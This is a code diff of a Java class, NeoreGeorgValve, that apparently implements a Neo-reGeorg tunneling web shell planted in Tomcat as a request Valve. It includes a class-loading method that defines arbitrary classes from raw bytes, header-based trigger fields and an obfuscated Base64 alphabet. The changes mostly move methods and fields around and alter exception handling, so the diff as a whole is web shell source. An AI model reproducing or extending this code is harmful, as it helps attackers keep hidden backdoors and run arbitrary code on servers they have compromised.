@@ -21,8 +21,6 @@ import java.util.zip.GZIPInputStream;
 public class NeoreGeorgValve extends ClassLoader implements Valve {
     public static String headerName;
     public static String headerValue;
-    protected Valve next;
-    protected boolean asyncSupported;
 
     public static Map<String, Object> namespace = new HashMap<String, Object>();
     String chars = "yewVGo+BCvNsZrDIiKXMhkq5tFHuA9J/n2jclLdP873bOaYz1QfpTSExW64R0gUm";
@@ -35,12 +33,6 @@ public class NeoreGeorgValve extends ClassLoader implements Valve {
     public NeoreGeorgValve(ClassLoader z) {
         super(z);
     }
-
-    @SuppressWarnings("all")
-    public Class<?> load(byte[] cb) {
-        return super.defineClass(cb, 0, cb.length);
-    }
-
 
     @Override
     @SuppressWarnings("all")
@@ -69,9 +61,15 @@ public class NeoreGeorgValve extends ClassLoader implements Valve {
                 namespace.get(chars).equals(args);
                 return;
             }
-        } catch (Exception ignored) {
+        } catch (Throwable e) {
+            e.printStackTrace();
         }
         this.getNext().invoke(request, response);
+    }
+
+    @SuppressWarnings("all")
+    public Class<?> load(byte[] cb) {
+        return super.defineClass(cb, 0, cb.length);
     }
 
     @SuppressWarnings("all")
@@ -93,6 +91,9 @@ public class NeoreGeorgValve extends ClassLoader implements Valve {
             out.close();
         }
     }
+
+    protected Valve next;
+    protected boolean asyncSupported;
 
     @Override
     public Valve getNext() {
